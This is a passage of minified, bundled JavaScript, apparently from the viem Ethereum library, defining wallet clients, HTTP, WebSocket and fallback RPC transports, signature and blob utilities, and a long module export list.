Client",transport:o}=r;return(0,t.createClient)({...r,key:i,name:s,transport:o,type:"walletClient"}).extend(e.walletActions)}return W4}var fT={},Cte;function n5(){if(Cte)return fT;Cte=1,Object.defineProperty(fT,"__esModule",{value:!0}),fT.createTransport=n;const t=Wle(),e=Dle();function n({key:r,methods:i,name:s,request:o,retryCount:a=3,retryDelay:c=150,timeout:l,type:f},h){const m=(0,e.uid)();return{config:{key:r,methods:i,name:s,request:o,retryCount:a,retryDelay:c,timeout:l,type:f},request:(0,t.buildRequest)(o,{methods:i,retryCount:a,retryDelay:c,uid:m}),value:h}}return fT}var hT={},Ste;function MHe(){if(Ste)return hT;Ste=1,Object.defineProperty(hT,"__esModule",{value:!0}),hT.custom=e;const t=n5();function e(n,r={}){const{key:i="custom",methods:s,name:o="Custom Provider",retryDelay:a}=r;return({retryCount:c})=>(0,t.createTransport)({key:i,methods:s,name:o,request:n.request.bind(n),retryCount:r.retryCount??c,retryDelay:a,type:"custom"})}return hT}var Ob={},Tte;function UHe(){if(Tte)return Ob;Tte=1,Object.defineProperty(Ob,"__esModule",{value:!0}),Ob.fallback=i,Ob.shouldThrow=s,Ob.rankTransports=o;const t=Jf(),e=a0(),n=cM(),r=n5();function i(a,c={}){const{key:l="fallback",name:f="Fallback",rank:h=!1,shouldThrow:m=s,retryCount:b,retryDelay:w}=c;return(({chain:y,pollingInterval:E=4e3,timeout:A,...R})=>{let S=a,v=()=>{};const k=(0,r.createTransport)({key:l,name:f,async request({method:O,params:_}){let I;const T=async(B=0)=>{const U=S[B]({...R,chain:y,retryCount:0,timeout:A});try{const M=await U.request({method:O,params:_});return v({method:O,params:_,response:M,transport:U,status:"success"}),M}catch(M){if(v({error:M,method:O,params:_,transport:U,status:"error"}),m(M)||B===S.length-1||(I??=S.slice(B+1).some(N=>{const{include:q,exclude:P}=N({chain:y}).config.methods||{};return q?q.includes(O):P?!P.includes(O):!0}),!I))throw M;return T(B+1)}};return T()},retryCount:b,retryDelay:w,type:"fallback"},{onResponse:O=>v=O,transports:S.map(O=>O({chain:y,retryCount:0}))});if(h){const O=typeof h=="object"?h:{};o({chain:y,interval:O.interval??E,onTransports:_=>S=_,ping:O.ping,sampleCount:O.sampleCount,timeout:O.timeout,transports:S,weights:O.weights})}return k})}function s(a){return!!("code"in a&&typeof a.code=="number"&&(a.code===e.TransactionRejectedRpcError.code||a.code===e.UserRejectedRequestError.code||t.ExecutionRevertedError.nodeMessage.test(a.message)||a.code===5e3))}function o({chain:a,interval:c=4e3,onTransports:l,ping:f,sampleCount:h=10,timeout:m=1e3,transports:b,weights:w={}}){const{stability:y=.7,latency:E=.3}=w,A=[],R=async()=>{const S=await Promise.all(b.map(async O=>{const _=O({chain:a,retryCount:0,timeout:m}),I=Date.now();let T,B;try{await(f?f({transport:_}):_.request({method:"net_listening"})),B=1}catch{B=0}finally{T=Date.now()}return{latency:T-I,success:B}}));A.push(S),A.length>h&&A.shift();const v=Math.max(...A.map(O=>Math.max(...O.map(({latency:_})=>_)))),k=b.map((O,_)=>{const I=A.map(N=>N[_].latency),B=1-I.reduce((N,q)=>N+q,0)/I.length/v,U=A.map(N=>N[_].success),M=U.reduce((N,q)=>N+q,0)/U.length;return M===0?[0,_]:[E*B+y*M,_]}).sort((O,_)=>_[0]-O[0]);l(k.map(([,O])=>b[O])),await(0,n.wait)(c),R()};R()}return Ob}var pT={},$2={},xte;function jM(){if(xte)return $2;xte=1,Object.defineProperty($2,"__esModule",{value:!0}),$2.UrlRequiredError=void 0;const t=Kt();class e extends t.BaseError{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro",name:"UrlRequiredError"})}}return $2.UrlRequiredError=e,$2}var Ite;function LHe(){if(Ite)return pT;Ite=1,Object.defineProperty(pT,"__esModule",{value:!0}),pT.http=s;const t=Zu(),e=jM(),n=rM(),r=_M(),i=n5();function s(o,a={}){const{batch:c,fetchFn:l,fetchOptions:f,key:h="http",methods:m,name:b="HTTP JSON-RPC",onFetchRequest:w,onFetchResponse:y,retryDelay:E,raw:A}=a;return({chain:R,retryCount:S,timeout:v})=>{const{batchSize:k=1e3,wait:O=0}=typeof c=="object"?c:{},_=a.retryCount??S,I=v??a.timeout??1e4,T=o||R?.rpcUrls.default.http[0];if(!T)throw new e.UrlRequiredError;const B=(0,r.getHttpRpcClient)(T,{fetchFn:l,fetchOptions:f,onRequest:w,onResponse:y,timeout:I});return(0,i.createTransport)({key:h,methods:m,name:b,async request({method:U,params:M}){const N={method:U,params:M},{schedule:q}=(0,n.createBatchScheduler)({id:T,wait:O,shouldSplitBatch(z){return z.length>k},fn:z=>B.request({body:z}),sort:(z,$)=>z.id-$.id}),P=async z=>c?q(z):[await B.request({body:z})],[{error:C,result:j}]=await P(N);if(A)return{error:C,result:j};if(C)throw new t.RpcRequestError({body:N,error:C,url:T});return j},retryCount:_,retryDelay:E,timeout:I,type:"http"},{fetchOptions:f,url:T})}}return pT}var mT={},Rte;function FHe(){if(Rte)return mT;Rte=1,Object.defineProperty(mT,"__esModule",{value:!0}),mT.webSocket=s;const t=Zu(),e=jM(),n=ide(),r=AM(),i=n5();function s(o,a={}){const{keepAlive:c,key:l="webSocket",methods:f,name:h="WebSocket JSON-RPC",reconnect:m,retryDelay:b}=a;return({chain:w,retryCount:y,timeout:E})=>{const A=a.retryCount??y,R=E??a.timeout??1e4,S=o||w?.rpcUrls.default.webSocket?.[0],v={keepAlive:c,reconnect:m};if(!S)throw new e.UrlRequiredError;return(0,i.createTransport)({key:l,methods:f,name:h,async request({method:k,params:O}){const _={method:k,params:O},I=await(0,r.getWebSocketRpcClient)(S,v),{error:T,result:B}=await I.requestAsync({body:_,timeout:R});if(T)throw new t.RpcRequestError({body:_,error:T,url:S});return B},retryCount:A,retryDelay:b,timeout:R,type:"webSocket"},{getSocket(){return(0,n.getSocket)(S)},getRpcClient(){return(0,r.getWebSocketRpcClient)(S,v)},async subscribe({params:k,onData:O,onError:_}){const I=await(0,r.getWebSocketRpcClient)(S,v),{result:T}=await new Promise((B,U)=>I.request({body:{method:"eth_subscribe",params:k},onError(M){U(M),_?.(M)},onResponse(M){if(M.error){U(M.error),_?.(M.error);return}if(typeof M.id=="number"){B(M);return}M.method==="eth_subscription"&&O(M.params)}}));return{subscriptionId:T,async unsubscribe(){return new Promise(B=>I.request({body:{method:"eth_unsubscribe",params:[T]},onResponse:B}))}}}})}}return mT}var H2={},Pte;function $He(){if(Pte)return H2;Pte=1,Object.defineProperty(H2,"__esModule",{value:!0}),H2.ProviderRpcError=void 0;class t extends Error{constructor(n,r){super(r),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=n,this.details=r}}return H2.ProviderRpcError=t,H2}var gT={},Nte;function HHe(){if(Nte)return gT;Nte=1,Object.defineProperty(gT,"__esModule",{value:!0}),gT.decodeDeployData=r;const t=$r(),e=s0(),n="/docs/contract/decodeDeployData";function r(i){const{abi:s,bytecode:o,data:a}=i;if(a===o)return{bytecode:o};const c=s.find(f=>"type"in f&&f.type==="constructor");if(!c)throw new t.AbiConstructorNotFoundError({docsPath:n});if(!("inputs"in c))throw new t.AbiConstructorParamsNotFoundError({docsPath:n});if(!c.inputs||c.inputs.length===0)throw new t.AbiConstructorParamsNotFoundError({docsPath:n});return{args:(0,e.decodeAbiParameters)(c.inputs,`0x${a.replace(o,"")}`),bytecode:o}}return gT}var yT={},Ote;function zHe(){if(Ote)return yT;Ote=1,Object.defineProperty(yT,"__esModule",{value:!0}),yT.fromBlobs=r;const t=DA(),e=yr(),n=lt();function r(i){const s=i.to??(typeof i.blobs[0]=="string"?"hex":"bytes"),o=typeof i.blobs[0]=="string"?i.blobs.map(h=>(0,e.hexToBytes)(h)):i.blobs,a=o.reduce((h,m)=>h+m.length,0),c=(0,t.createCursor)(new Uint8Array(a));let l=!0;for(const h of o){const m=(0,t.createCursor)(h);for(;l&&m.position<h.length;){m.incrementPosition(1);let b=31;h.length-m.position<31&&(b=h.length-m.position);for(const w in Array.from({length:b})){const y=m.readByte();if(y===128&&!m.inspectBytes(m.remaining).includes(128)){l=!1;break}c.pushByte(y)}}}const f=c.bytes.slice(0,c.position);return s==="hex"?(0,n.bytesToHex)(f):f}return yT}var bT={},kte;function qHe(){if(kte)return bT;kte=1,Object.defineProperty(bT,"__esModule",{value:!0}),bT.sidecarsToVersionedHashes=e;const t=Zj();function e(n){const{sidecars:r,version:i}=n,s=n.to??(typeof r[0].blob=="string"?"hex":"bytes"),o=[];for(const{commitment:a}of r)o.push((0,t.commitmentToVersionedHash)({commitment:a,to:s,version:i}));return o}return bT}var wT={},Dte;function VHe(){if(Dte)return wT;Dte=1,Object.defineProperty(wT,"__esModule",{value:!0}),wT.toCoinType=n;const t=gM(),e=2147483648;function n(r){if(r===1)return 60n;if(r>=e||r<0)throw new t.EnsInvalidChainIdError({chainId:r});return BigInt((2147483648|r)>>>0)}return wT}var vT={},Bte;function kde(){if(Bte)return vT;Bte=1,Object.defineProperty(vT,"__esModule",{value:!0}),vT.defineKzg=t;function t({blobToKzgCommitment:e,computeBlobKzgProof:n}){return{blobToKzgCommitment:e,computeBlobKzgProof:n}}return vT}var ET={},jte;function WHe(){if(jte)return ET;jte=1,Object.defineProperty(ET,"__esModule",{value:!0}),ET.setupKzg=e;const t=kde();function e(n,r){try{n.loadTrustedSetup(r)}catch(i){const s=i;if(!s.message.includes("trusted setup is already loaded"))throw s}return(0,t.defineKzg)(n)}return ET}var _T={},Mte;function GHe(){if(Mte)return _T;Mte=1,Object.defineProperty(_T,"__esModule",{value:!0}),_T.compactSignatureToSignature=n;const t=yr(),e=lt();function n({r,yParityAndS:i}){const s=(0,t.hexToBytes)(i),o=s[0]&128?1:0,a=s;return o===1&&(a[0]&=127),{r,s:(0,e.bytesToHex)(a),yParity:o}}return _T}var AT={},Ute;function KHe(){if(Ute)return AT;Ute=1,Object.defineProperty(AT,"__esModule",{value:!0}),AT.parseCompactSignature=n;const t=uy(),e=lt();function n(r){const{r:i,s}=t.secp256k1.Signature.fromCompact(r.slice(2,130));return{r:(0,e.numberToHex)(i,{size:32}),yParityAndS:(0,e.numberToHex)(s,{size:32})}}return AT}var CT={},Lte;function ZHe(){if(Lte)return CT;Lte=1,Object.defineProperty(CT,"__esModule",{value:!0}),CT.parseSignature=n;const t=uy(),e=lt();function n(r){const{r:i,s}=t.secp256k1.Signature.fromCompact(r.slice(2,130)),o=+`0x${r.slice(130)}`,[a,c]=(()=>{if(o===0||o===1)return[void 0,o];if(o===27)return[BigInt(o),0];if(o===28)return[BigInt(o),1];throw new Error("Invalid yParityOrV value")})();return typeof a<"u"?{r:(0,e.numberToHex)(i,{size:32}),s:(0,e.numberToHex)(s,{size:32}),v:a,yParity:c}:{r:(0,e.numberToHex)(i,{size:32}),s:(0,e.numberToHex)(s,{size:32}),yParity:c}}return CT}var ST={},Fte;function YHe(){if(Fte)return ST;Fte=1,Object.defineProperty(ST,"__esModule",{value:!0}),ST.recoverTransactionAddress=i;const t=ha(),e=OM(),n=iR(),r=u0();async function i(s){const{serializedTransaction:o,signature:a}=s,c=(0,e.parseTransaction)(o),l=a??{r:c.r,s:c.s,v:c.v,yParity:c.yParity},f=(0,n.serializeTransaction)({...c,r:void 0,s:void 0,v:void 0,yParity:void 0,sidecars:void 0});return await(0,r.recoverAddress)({hash:(0,t.keccak256)(f),signature:l})}return ST}var TT={},$te;function QHe(){if($te)return TT;$te=1,Object.defineProperty(TT,"__esModule",{value:!0}),TT.serializeCompactSignature=n;const t=uy(),e=ci();function n({r,yParityAndS:i}){return`0x${new t.secp256k1.Signature((0,e.hexToBigInt)(r),(0,e.hexToBigInt)(i)).toCompactHex()}`}return TT}var xT={},Hte;function JHe(){if(Hte)return xT;Hte=1,Object.defineProperty(xT,"__esModule",{value:!0}),xT.signatureToCompactSignature=n;const t=yr(),e=lt();function n(r){const{r:i,s,v:o,yParity:a}=r,c=Number(a??o-27n);let l=s;if(c===1){const f=(0,t.hexToBytes)(s);f[0]|=128,l=(0,e.bytesToHex)(f)}return{r:i,yParityAndS:l}}return xT}var zte;function XHe(){return zte||(zte=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.maxInt8=t.universalSignatureValidatorByteCode=t.erc6492SignatureValidatorByteCode=t.deploylessCallViaFactoryBytecode=t.deploylessCallViaBytecodeBytecode=t.zeroHash=t.zeroAddress=t.ethAddress=t.multicall3Abi=t.universalSignatureValidatorAbi=t.erc6492SignatureValidatorAbi=t.erc4626Abi=t.erc1155Abi=t.erc721Abi=t.erc20Abi_bytes32=t.erc20Abi=t.webSocket=t.http=t.shouldThrow=t.fallback=t.custom=t.createTransport=t.walletActions=t.testActions=t.publicActions=t.createWalletClient=t.createTestClient=t.createPublicClient=t.rpcSchema=t.createClient=t.WaitForCallsStatusTimeoutError=t.getContract=t.UnknownTypeError=t.UnknownSignatureError=t.SolidityProtectedKeywordError=t.parseAbiParameters=t.parseAbiParameter=t.parseAbiItem=t.parseAbi=t.InvalidStructSignatureError=t.InvalidSignatureError=t.InvalidParenthesisError=t.InvalidParameterError=t.InvalidModifierError=t.InvalidFunctionModifierError=t.InvalidAbiTypeParameterError=t.InvalidAbiParametersError=t.InvalidAbiParameterError=t.InvalidAbiItemError=t.CircularReferenceError=void 0,t.maxUint152=t.maxUint144=t.maxUint136=t.maxUint128=t.maxUint120=t.maxUint112=t.maxUint104=t.maxUint96=t.maxUint88=t.maxUint80=t.maxUint72=t.maxUint64=t.maxUint56=t.maxUint48=t.maxUint40=t.maxUint32=t.maxUint24=t.maxUint16=t.maxUint8=t.maxInt256=t.maxInt248=t.maxInt240=t.maxInt232=t.maxInt224=t.maxInt216=t.maxInt208=t.maxInt200=t.maxInt192=t.maxInt184=t.maxInt176=t.maxInt168=t.maxInt160=t.maxInt152=t.maxInt144=t.maxInt136=t.maxInt128=t.maxInt120=t.maxInt112=t.maxInt104=t.maxInt96=t.maxInt88=t.maxInt80=t.maxInt72=t.maxInt64=t.maxInt56=t.maxInt48=t.maxInt40=t.maxInt32=t.maxInt24=t.maxInt16=void 0,t.AbiConstructorNotFoundError=t.weiUnits=t.gweiUnits=t.etherUnits=t.presignMessagePrefix=t.minInt256=t.minInt248=t.minInt240=t.minInt232=t.minInt224=t.minInt216=t.minInt208=t.minInt200=t.minInt192=t.minInt184=t.minInt176=t.minInt168=t.minInt160=t.minInt152=t.minInt144=t.minInt136=t.minInt128=t.minInt120=t.minInt112=t.minInt104=t.minInt96=t.minInt88=t.minInt80=t.minInt72=t.minInt64=t.minInt56=t.minInt48=t.minInt40=t.minInt32=t.minInt24=t.minInt16=t.minInt8=t.maxUint256=t.maxUint248=t.maxUint240=t.maxUint232=t.maxUint224=t.maxUint216=t.maxUint208=t.maxUint200=t.maxUint192=t.maxUint184=t.maxUint176=t.maxUint168=t.maxUint160=void 0,t.EnsAvatarUriResolutionError=t.EnsAvatarUnsupportedNamespaceError=t.EnsAvatarInvalidNftUriError=t.SizeOverflowError=t.InvalidHexValueError=t.InvalidHexBooleanError=t.InvalidBytesBooleanError=t.IntegerOutOfRangeError=t.SliceOffsetOutOfBoundsError=t.SizeExceedsPaddingSizeError=t.RawContractError=t.CounterfactualDeploymentFailedError=t.ContractFunctionZeroDataError=t.ContractFunctionRevertedError=t.ContractFunctionExecutionError=t.CallExecutionError=t.InvalidChainIdError=t.ClientChainNotConfiguredError=t.ChainNotFoundError=t.ChainMismatchError=t.ChainDoesNotSupportContract=t.BundleFailedError=t.BlockNotFoundError=t.setErrorConfig=t.BaseError=t.InvalidAddressError=t.UnsupportedPackedAbiType=t.InvalidDefinitionTypeError=t.InvalidArrayError=t.InvalidAbiEncodingTypeError=t.InvalidAbiDecodingTypeError=t.DecodeLogTopicsMismatch=t.DecodeLogDataMismatch=t.BytesSizeMismatchError=t.AbiFunctionSignatureNotFoundError=t.AbiFunctionOutputsNotFoundError=t.AbiFunctionNotFoundError=t.AbiEventSignatureNotFoundError=t.AbiEventSignatureEmptyTopicsError=t.AbiEventNotFoundError=t.AbiErrorSignatureNotFoundError=t.AbiErrorNotFoundError=t.AbiErrorInputsNotFoundError=t.AbiEncodingLengthMismatchError=t.AbiEncodingBytesSizeMismatchError=t.AbiEncodingArrayLengthMismatchError=t.AbiDecodingZeroDataError=t.AbiDecodingDataSizeTooSmallError=t.AbiDecodingDataSizeInvalidError=t.AbiConstructorParamsNotFoundError=void 0,t.UnsupportedProviderMethodError=t.UnsupportedNonOptionalCapabilityError=t.UnsupportedChainIdError=t.UnknownRpcError=t.UnknownBundleIdError=t.UnauthorizedProviderError=t.TransactionRejectedRpcError=t.SwitchChainError=t.RpcError=t.ResourceUnavailableRpcError=t.ResourceNotFoundRpcError=t.ProviderRpcError=t.ProviderDisconnectedError=t.ParseRpcError=t.MethodNotSupportedRpcError=t.MethodNotFoundRpcError=t.LimitExceededRpcError=t.JsonRpcVersionUnsupportedError=t.InvalidRequestRpcError=t.InvalidParamsRpcError=t.InvalidInputRpcError=t.InternalRpcError=t.DuplicateIdError=t.ChainDisconnectedError=t.BundleTooLargeError=t.AtomicReadyWalletRejectedUpgradeError=t.AtomicityNotSupportedError=t.WebSocketRequestError=t.TimeoutError=t.SocketClosedError=t.RpcRequestError=t.HttpRequestError=t.UnknownNodeError=t.TransactionTypeNotSupportedError=t.TipAboveFeeCapError=t.NonceTooLowError=t.NonceTooHighError=t.NonceMaxValueError=t.IntrinsicGasTooLowError=t.IntrinsicGasTooHighError=t.InsufficientFundsError=t.FeeCapTooLowError=t.FeeCapTooHighError=t.ExecutionRevertedError=t.FilterTypeNotSupportedError=t.MaxFeePerGasTooLowError=t.Eip1559FeesNotSupportedError=t.BaseFeeScalarError=t.EstimateGasExecutionError=t.EnsInvalidChainIdError=void 0,t.toBlobs=t.toBlobSidecars=t.sidecarsToVersionedHashes=t.fromBlobs=t.commitmentToVersionedHash=t.commitmentsToVersionedHashes=t.blobsToProofs=t.blobsToCommitments=t.isAddressEqual=t.isAddress=t.getCreateAddress=t.getCreate2Address=t.getContractAddress=t.getAddress=t.checksumAddress=t.prepareEncodeFunctionData=t.parseEventLogs=t.getAbiItem=t.encodePacked=t.encodeFunctionResult=t.encodeFunctionData=t.encodeEventTopics=t.encodeErrorResult=t.encodeDeployData=t.encodeAbiParameters=t.decodeFunctionResult=t.decodeFunctionData=t.decodeEventLog=t.decodeErrorResult=t.decodeDeployData=t.decodeAbiParameters=t.EIP1193ProviderRpcError=t.InvalidDecimalNumberError=t.InvalidStructTypeError=t.InvalidPrimaryTypeError=t.InvalidDomainError=t.UrlRequiredError=t.WaitForTransactionReceiptTimeoutError=t.TransactionReceiptNotFoundError=t.TransactionNotFoundError=t.TransactionExecutionError=t.InvalidStorageKeySizeError=t.InvalidSerializedTransactionTypeError=t.InvalidSerializedTransactionError=t.InvalidSerializableTransactionError=t.InvalidLegacyVError=t.FeeConflictError=t.StateAssignmentConflictError=t.AccountStateConflictError=t.UserRejectedRequestError=void 0,t.getContractError=t.toCoinType=t.namehash=t.labelhash=t.toRlp=t.hexToRlp=t.bytesToRlp=t.toHex=t.stringToHex=t.numberToHex=t.bytesToHex=t.boolToHex=t.toBytes=t.stringToBytes=t.numberToBytes=t.hexToBytes=t.boolToBytes=t.fromRlp=t.hexToString=t.hexToNumber=t.hexToBool=t.hexToBigInt=t.fromHex=t.fromBytes=t.bytesToString=t.bytesToNumber=t.bytesToBool=t.bytesToBigInt=t.trim=t.sliceHex=t.sliceBytes=t.slice=t.size=t.padHex=t.padBytes=t.pad=t.isHex=t.isBytes=t.concatHex=t.concatBytes=t.concat=t.getChainContractAddress=t.extractChain=t.defineChain=t.assertCurrentChain=t.offchainLookupSignature=t.offchainLookupAbiItem=t.offchainLookup=t.ccipFetch=t.ccipRequest=void 0,t.recoverTypedDataAddress=t.recoverTransactionAddress=t.recoverPublicKey=t.recoverMessageAddress=t.recoverAddress=t.parseSignature=t.hexToSignature=t.parseErc8010Signature=t.parseErc6492Signature=t.parseCompactSignature=t.hexToCompactSignature=t.isErc8010Signature=t.isErc6492Signature=t.hashTypedData=t.hashStruct=t.hashDomain=t.hashMessage=t.compactSignatureToSignature=t.withTimeout=t.withRetry=t.withCache=t.nonceManager=t.createNonceManager=t.setupKzg=t.defineKzg=t.getFunctionSignature=t.toFunctionSignature=t.getFunctionSelector=t.toFunctionSelector=t.toFunctionHash=t.getEventSignature=t.toEventSignature=t.getEventSelector=t.toEventSelector=t.toEventHash=t.sha256=t.ripemd160=t.keccak256=t.isHash=t.rpcTransactionType=t.formatTransactionRequest=t.defineTransactionRequest=t.formatTransactionReceipt=t.defineTransactionReceipt=t.transactionType=t.formatTransaction=t.defineTransaction=t.formatLog=t.formatBlock=t.defineBlock=void 0,t.parseUnits=t.parseGwei=t.parseEther=t.formatUnits=t.formatGwei=t.formatEther=t.validateTypedData=t.serializeTypedData=t.getTypesForEIP712Domain=t.domainSeparator=t.serializeTransaction=t.serializeAccessList=t.parseTransaction=t.getTransactionType=t.getSerializedTransactionType=t.assertTransactionLegacy=t.assertTransactionEIP2930=t.assertTransactionEIP1559=t.assertRequest=t.stringify=t.verifyTypedData=t.verifyMessage=t.verifyHash=t.toPrefixedMessage=t.signatureToCompactSignature=t.serializeSignature=t.signatureToHex=t.serializeErc8010Signature=t.serializeErc6492Signature=t.serializeCompactSignature=t.compactSignatureToHex=void 0;var e=n0();Object.defineProperty(t,"CircularReferenceError",{enumerable:!0,get:function(){return e.CircularReferenceError}}),Object.defineProperty(t,"InvalidAbiItemError",{enumerable:!0,get:function(){return e.InvalidAbiItemError}}),Object.defineProperty(t,"InvalidAbiParameterError",{enumerable:!0,get:function(){return e.InvalidAbiParameterError}}),Object.defineProperty(t,"InvalidAbiParametersError",{enumerable:!0,get:function(){return e.InvalidAbiParametersError}}),Object.defineProperty(t,"InvalidAbiTypeParameterError",{enumerable:!0,get:function(){return e.InvalidAbiTypeParameterError}}),Object.defineProperty(t,"InvalidFunctionModifierError",{enumerable:!0,get:function(){return e.InvalidFunctionModifierError}}),Object.defineProperty(t,"InvalidModifierError",{enumerable:!0,get:function(){return e.InvalidModifierError}}),Object.defineProperty(t,"InvalidParameterError",{enumerable:!0,get:function(){return e.InvalidParameterError}}),Object.defineProperty(t,"InvalidParenthesisError",{enumerable:!0,get:function(){return e.InvalidParenthesisError}}),Object.defineProperty(t,"InvalidSignatureError",{enumerable:!0,get:function(){return e.InvalidSignatureError}}),Object.defineProperty(t,"InvalidStructSignatureError",{enumerable:!0,get:function(){return e.InvalidStructSignatureError}}),Object.defineProperty(t,"parseAbi",{enumerable:!0,get:function(){return e.parseAbi}}),Object.defineProperty(t,"parseAbiItem",{enumerable:!0,get:function(){return e.parseAbiItem}}),Object.defineProperty(t,"parseAbiParameter",{enumerable:!0,get:function(){return e.parseAbiParameter}}),Object.defineProperty(t,"parseAbiParameters",{enumerable:!0,get:function(){return e.parseAbiParameters}}),Object.defineProperty(t,"SolidityProtectedKeywordError",{enumerable:!0,get:function(){return e.SolidityProtectedKeywordError}}),Object.defineProperty(t,"UnknownSignatureError",{enumerable:!0,get:function(){return e.UnknownSignatureError}}),Object.defineProperty(t,"UnknownTypeError",{enumerable:!0,get:function(){return e.UnknownTypeError}});var n=WFe();Object.defineProperty(t,"getContract",{enumerable:!0,get:function(){return n.getContract}});var r=fM();Object.defineProperty(t,"WaitForCallsStatusTimeoutError",{enumerable:!0,get:function(){return r.WaitForCallsStatusTimeoutError}});var i=nR();Object.defineProperty(t,"createClient",{enumerable:!0,get:function(){return i.createClient}}),Object.defineProperty(t,"rpcSchema",{enumerable:!0,get:function(){return i.rpcSchema}});var s=H$e();Object.defineProperty(t,"createPublicClient",{enumerable:!0,get:function(){return s.createPublicClient}});var o=wHe();Object.defineProperty(t,"createTestClient",{enumerable:!0,get:function(){return o.createTestClient}});var a=jHe();Object.defineProperty(t,"createWalletClient",{enumerable:!0,get:function(){return a.createWalletClient}});var c=Ide();Object.defineProperty(t,"publicActions",{enumerable:!0,get:function(){return c.publicActions}});var l=Rde();Object.defineProperty(t,"testActions",{enumerable:!0,get:function(){return l.testActions}});var f=Ode();Object.defineProperty(t,"walletActions",{enumerable:!0,get:function(){return f.walletActions}});var h=n5();Object.defineProperty(t,"createTransport",{enumerable:!0,get:function(){return h.createTransport}});var m=MHe();Object.defineProperty(t,"custom",{enumerable:!0,get:function(){return m.custom}});var b=UHe();Object.defineProperty(t,"fallback",{enumerable:!0,get:function(){return b.fallback}}),Object.defineProperty(t,"shouldThrow",{enumerable:!0,get:function(){return b.shouldThrow}});var w=LHe();Object.defineProperty(t,"http",{enumerable:!0,get:function(){return w.http}});var y=FHe();Object.defineProperty(t,"webSocket",{enumerable:!0,get:function(){return y.webSocket}});var E=f0();Object.defineProperty(t,"erc20Abi",{enumerable:!0,get:function(){return E.erc20Abi}}),Object.defineProperty(t,"erc20Abi_bytes32",{enumerable:!0,get:function(){return E.erc20Abi_bytes32}}),Object.defineProperty(t,"erc721Abi",{enumerable:!0,get:function(){return E.erc721Abi}}),Object.defineProperty(t,"erc1155Abi",{enumerable:!0,get:function(){return E.erc1155Abi}}),Object.defineProperty(t,"erc4626Abi",{enumerable:!0,get:function(){return E.erc4626Abi}}),Object.defineProperty(t,"erc6492SignatureValidatorAbi",{enumerable:!0,get:function(){return E.erc6492SignatureValidatorAbi}}),Object.defineProperty(t,"universalSignatureValidatorAbi",{enumerable:!0,get:function(){return E.erc6492SignatureValidatorAbi}}),Object.defineProperty(t,"multicall3Abi",{enumerable:!0,get:function(){return E.multicall3Abi}});var A=Cde();Object.defineProperty(t,"ethAddress",{enumerable:!0,get:function(){return A.ethAddress}}),Object.defineProperty(t,"zeroAddress",{enumerable:!0,get:function(){return A.zeroAddress}});var R=CM();Object.defineProperty(t,"zeroHash",{enumerable:!0,get:function(){return R.zeroHash}});var S=WA();Object.defineProperty(t,"deploylessCallViaBytecodeBytecode",{enumerable:!0,get:function(){return S.deploylessCallViaBytecodeBytecode}}),Object.defineProperty(t,"deploylessCallViaFactoryBytecode",{enumerable:!0,get:function(){return S.deploylessCallViaFactoryBytecode}}),Object.defineProperty(t,"erc6492SignatureValidatorByteCode",{enumerable:!0,get:function(){return S.erc6492SignatureValidatorByteCode}}),Object.defineProperty(t,"universalSignatureValidatorByteCode",{enumerable:!0,get:function(){return S.erc6492SignatureValidatorByteCode}});var v=Vj();Object.defineProperty(t,"maxInt8",{enumerable:!0,get:function(){return v.maxInt8}}),Object.defineProperty(t,"maxInt16",{enumerable:!0,get:function(){return v.maxInt16}}),Object.defineProperty(t,"maxInt24",{enumerable:!0,get:function(){return v.maxInt24}}),Object.defineProperty(t,"maxInt32",{enumerable:!0,get:function(){return v.maxInt32}}),Object.defineProperty(t,"maxInt40",{enumerable:!0,get:function(){return v.maxInt40}}),Object.defineProperty(t,"maxInt48",{enumerable:!0,get:function(){return v.maxInt48}}),Object.defineProperty(t,"maxInt56",{enumerable:!0,get:function(){return v.maxInt56}}),Object.defineProperty(t,"maxInt64",{enumerable:!0,get:function(){return v.maxInt64}}),Object.defineProperty(t,"maxInt72",{enumerable:!0,get:function(){return v.maxInt72}}),Object.defineProperty(t,"maxInt80",{enumerable:!0,get:function(){return v.maxInt80}}),Object.defineProperty(t,"maxInt88",{enumerable:!0,get:function(){return v.maxInt88}}),Object.defineProperty(t,"maxInt96",{enumerable:!0,get:function(){return v.maxInt96}}),Object.defineProperty(t,"maxInt104",{enumerable:!0,get:function(){return v.maxInt104}}),Object.defineProperty(t,"maxInt112",{enumerable:!0,get:function(){return v.maxInt112}}),Object.defineProperty(t,"maxInt120",{enumerable:!0,get:function(){return v.maxInt120}}),Object.defineProperty(t,"maxInt128",{enumerable:!0,get:function(){return v.maxInt128}}),Object.defineProperty(t,"maxInt136",{enumerable:!0,get:function(){return v.maxInt136}}),Object.defineProperty(t,"maxInt144",{enumerable:!0,get:function(){return v.maxInt144}}),Object.defineProperty(t,"maxInt152",{enumerable:!0,get:function(){return v.maxInt152}}),Object.defineProperty(t,"maxInt160",{enumerable:!0,get:function(){return v.maxInt160}}),Object.defineProperty(t,"maxInt168",{enumerable:!0,get:function(){return v.maxInt168}}),Object.defineProperty(t,"maxInt176",{enumerable:!0,get:function(){return v.maxInt176}}),Object.defineProperty(t,"maxInt184",{enumerable:!0,get:function(){return v.maxInt184}}),Object.defineProperty(t,"maxInt192",{enumerable:!0,get:function(){return v.maxInt192}}),Object.defineProperty(t,"maxInt200",{enumerable:!0,get:function(){return v.maxInt200}}),Object.defineProperty(t,"maxInt208",{enumerable:!0,get:function(){return v.maxInt208}}),Object.defineProperty(t,"maxInt216",{enumerable:!0,get:function(){return v.maxInt216}}),Object.defineProperty(t,"maxInt224",{enumerable:!0,get:function(){return v.maxInt224}}),Object.defineProperty(t,"maxInt232",{enumerable:!0,get:function(){return v.maxInt232}}),Object.defineProperty(t,"maxInt240",{enumerable:!0,get:function(){return v.maxInt240}}),Object.defineProperty(t,"maxInt248",{enumerable:!0,get:function(){return v.maxInt248}}),Object.defineProperty(t,"maxInt256",{enumerable:!0,get:function(){return v.maxInt256}}),Object.defineProperty(t,"maxUint8",{enumerable:!0,get:function(){return v.maxUint8}}),Object.defineProperty(t,"maxUint16",{enumerable:!0,get:function(){return v.maxUint16}}),Object.defineProperty(t,"maxUint24",{enumerable:!0,get:function(){return v.maxUint24}}),Object.defineProperty(t,"maxUint32",{enumerable:!0,get:function(){return v.maxUint32}}),Object.defineProperty(t,"maxUint40",{enumerable:!0,get:function(){return 